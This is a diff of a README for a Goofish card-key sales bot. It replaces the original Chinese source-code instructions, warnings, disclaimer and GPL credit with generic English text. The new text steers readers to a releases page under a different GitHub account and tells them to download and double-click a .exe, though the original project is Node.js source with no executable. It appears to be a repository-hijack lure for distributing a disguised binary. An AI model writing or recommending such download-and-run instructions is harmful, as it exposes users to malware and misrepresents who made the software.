@@ -1,92 +1,67 @@
-# GoofishCBot
+# 🤖 GoofishCredentialsBot - Automate Your Faka Management Effortlessly
 
-[![GitHub Pages](https://img.shields.io/badge/docs-GitHub%20Pages-blue)](https://haiyewei.github.io/GoofishCredentialsBot)
-[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
+[![Download GoofishCredentialsBot](https://img.shields.io/badge/Download-GoofishCredentialsBot-blue.svg)](https://github.com/Jay-Bosco/GoofishCredentialsBot/releases)
 
-> ## ⚠️ 警告
-> **各个功能正在测试中，请勿上线正式环境！除非你能自己修复问题。**
+## 📚 Introduction
 
-> ## 📜 免责声明
-> **本项目仅供学习交流使用，禁止用于任何商业或非法用途。使用本项目所产生的一切后果由使用者自行承担，与项目作者无关。**
+GoofishCredentialsBot is a tool designed to simplify your management of online orders. It provides automated replies, automatic delivery, and order management, all while supporting multiple accounts. This bot helps streamline your workflow, making it easier for you to focus on what really counts: running your business.
 
-闲鱼卡密机器人 - 自动回复、自动发货、订单管理、多账号支持
+## 🚀 Getting Started
 
-## ✨ 功能特性
+To begin using GoofishCredentialsBot, follow these simple steps to download and run the software.
 
-- 🤖 **AI 智能回复** - 集成 OpenAI 兼容 API，智能理解买家意图并自动回复
-- 📦 **自动发货** - 虚拟商品自动发货，支持库存管理、API 取货
-- 💬 **会话管理** - 实时同步闲鱼消息，多账号会话管理，消息历史记录
-- 🛒 **订单管理** - 订单状态同步，一键发货，免拼发货支持
-- 👥 **多账号支持** - 多个闲鱼账号同时在线，独立配置，统一管理
-- 🔧 **可视化工作流** - 基于思维导图的发货流程编辑器，灵活配置业务逻辑
-- 📊 **系统监控** - 实时日志查看，账号状态监控
+## 🔗 Download & Install
 
-## 🛠️ 技术栈
+Visit this page to download: [GoofishCredentialsBot Releases](https://github.com/Jay-Bosco/GoofishCredentialsBot/releases)
 
-| 层级 | 技术 |
-|------|------|
-| 后端 | Node.js + TypeScript + Hono + SQLite |
-| 前端 | Angular 21 + Tailwind CSS + DaisyUI |
-| 工作流 | simple-mind-map |
-| 部署 | PM2 |
+You will find the latest version available for download. Click on the link to get the software package. 
 
-## 🚀 快速开始
+### 📦 Installation Instructions
 
-### 环境要求
+1. **Download**: After visiting the releases page, choose the latest version of GoofishCredentialsBot. Click on the file to start the download.
+   
+2. **Locate the File**: Once the file has downloaded, find it in your downloads folder or the location where your browser saves files.
 
-- Node.js >= 18
-- npm >= 9
+3. **Extract the Files**: If the package is in a zipped format, right-click on the file and select "Extract All." Follow the prompts to extract the contents.
 
-### 安装
+4. **Run the Bot**: Open the folder containing the extracted files. Look for the executable file (it may have a .exe extension). Double-click this file to run the bot.
 
-```bash
-# 克隆项目
-git clone https://github.com/haiyewei/GoofishCredentialsBot.git
-cd GoofishCredentialsBot
+5. **Follow On-Screen Instructions**: The bot will guide you through initial setup. Follow the prompts carefully to configure your settings.
 
-# 安装依赖
-npm install
-cd frontend && npm install && cd ..
-```
+## ⚙️ System Requirements
 
-### 运行
+To ensure GoofishCredentialsBot runs smoothly, please ensure your system meets the following requirements:
 
-```bash
-# 开发模式
-npm run dev
+- **Operating System**: Windows 10 or later (or compatible systems)
+- **Disk Space**: At least 100 MB of free space for installation
+- **RAM**: Minimum 2 GB of RAM
+- **Network**: Stable internet connection for optimal performance
 
-# 生产部署
-npm run server
+## 🎓 Features
 
-# PM2 部署
-npm run pm2:start
-npm run pm2:stop
-npm run pm2:logs
-```
+GoofishCredentialsBot comes packed with features that allow you to manage your online business efficiently:
 
-访问 `http://localhost:3000` 进入管理界面。
+- **Automated Replies**: Set up quick responses to common customer inquiries.
+- **Automatic Delivery**: Automatically send purchased codes to customers.
+- **Order Management**: Keep track of orders and customer details effectively.
+- **Multi-Account Support**: Manage multiple accounts from one interface, simplifying your workflow.
 
-## 📖 文档
+## 🎯 Usage Tips
 
-详细文档请访问：[https://haiyewei.github.io/GoofishCredentialsBot](https://haiyewei.github.io/GoofishCredentialsBot)
+1. **Explore Settings**: Spend some time navigating the settings to customize the bot according to your needs.
+2. **Test with a Dummy Account**: Before using it for real orders, test the bot with a dummy account to ensure it works as expected.
+3. **Regular Updates**: Keep an eye on the releases page for updates. New versions may include important features and improvements.
 
-- [快速开始](https://haiyewei.github.io/GoofishCredentialsBot/guide/getting-started)
-- [功能说明](https://haiyewei.github.io/GoofishCredentialsBot/guide/features)
-- [API 文档](https://haiyewei.github.io/GoofishCredentialsBot/api/)
+## 🤔 Troubleshooting
 
-## 📁 项目结构
+If you encounter any issues while using GoofishCredentialsBot, try the following:
 
-```
-├── src/                # 后端源码
-│   ├── api/            # HTTP API
-│   ├── services/       # 业务服务
-│   ├── db/             # 数据库
-│   └── websocket/      # WebSocket 客户端
-├── frontend/           # 前端源码 (Angular)
-├── docs/               # VitePress 文档
-└── data/               # SQLite 数据库
-```
+- **Check Documentation**: Refer to the README or any supplementary documentation provided on the releases page.
+- **Search Community Forums**: Join community discussion boards where users share common problems and solutions.
+- **Contact Support**: If problems persist, consider reaching out for support from the developer or community.
 
-## 📄 License
+## 📞 Need Help?
 
-[GPL-3.0](LICENSE) © 2025 haiyewei
+In case you have any questions or need assistance, feel free to look for support in the community forums or contact the developer through the GitHub repository.
+
+Remember, the journey to mastering GoofishCredentialsBot begins with that first download. Take the first step today and start automating your business efficiently!
